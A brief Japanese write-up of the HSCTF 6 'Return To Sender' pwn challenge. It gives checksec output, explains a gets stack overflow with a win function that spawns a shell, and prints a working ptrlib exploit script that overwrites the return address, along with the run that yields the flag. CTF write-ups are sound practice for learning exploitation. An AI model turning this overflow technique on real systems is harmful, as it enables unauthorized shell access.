# [pwn 167pts] Return To Sender - HSCTF 6
32ビットです。
```
$ checksec -f return-to-sender
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols     No	0		4	return-to-sender
```

getsによるStack Overflowがあります。
また、シェルを呼び出してくれるwin関数があるので、これを利用しましょう。

```python
from ptrlib import *

elf = ELF("./return-to-sender")
#sock = Process("./return-to-sender")
sock = Socket("pwn.hsctf.com", 1234)

payload = b'A' * 0x14
payload += p32(elf.symbol("win"))
sock.sendline(payload)

sock.interactive()
```

簡単ですね。
```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:1234
[ptrlib]$ Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA¶ it goes!
cat flag
[ptrlib]$ hsctf{fedex_dont_fail_me_now}
```

# 感想
基礎問だと思います。